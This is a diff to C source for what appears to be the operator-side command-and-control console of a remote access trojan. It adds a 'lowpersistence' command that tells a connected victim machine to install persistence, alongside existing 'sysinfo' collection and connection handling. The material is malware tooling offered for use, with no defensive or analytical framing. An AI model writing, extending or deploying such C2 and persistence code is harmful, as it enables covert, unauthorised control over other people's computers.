@@ -60,6 +60,7 @@ void closeConection(int targetConn, char *command, size_t instructLen, char *cli
     snprintf(formattedString1, sizeof(formattedString1), " %s-%u ", clientIP, clientPort);
     printf("\n\t%s[*>] %s Closing Connection to  %s ===> %s %s", YELLOW, RED, end, formattedString1, YELLOW); 
     send(targetConn, command, instructLen, 0);
+    sleep(0.2);
     close(targetConn);
     close(serverSock);
 }
@@ -307,6 +308,20 @@ void StartGetSysInfo(int targetConn, char *command){
 
 }
 
+int setLowPersistence(int targetConn, char *command){
+    send(targetConn, command, strlen(command), 0);
+    char* recvData = malloc(SOCKBUFFER);    
+
+    recv(targetConn, recvData, SOCKBUFFER, 0);
+    if (strcmp("error", recvData) == 0){
+        printf("\n\n\t%s[!>] %sError gettin low persistence...\n\n%s", RED, YELLOW, end);
+    }
+
+    else if (strcmp("exito", recvData) == 0){
+        printf("\n\n\t%s[*>] %sLow persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);
+    }
+}
+
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
     char command[255] = "";
     char resp[SOCKBUFFER];
@@ -350,6 +365,9 @@ int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
             else if(strcmp(command, "sysinfo") == 0)
                 StartGetSysInfo(targetConn, command);
                 
+            else if (strcmp(command, "lowpersistence") == 0)
+                setLowPersistence(targetConn, command);
+        
             else 
                 printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
             
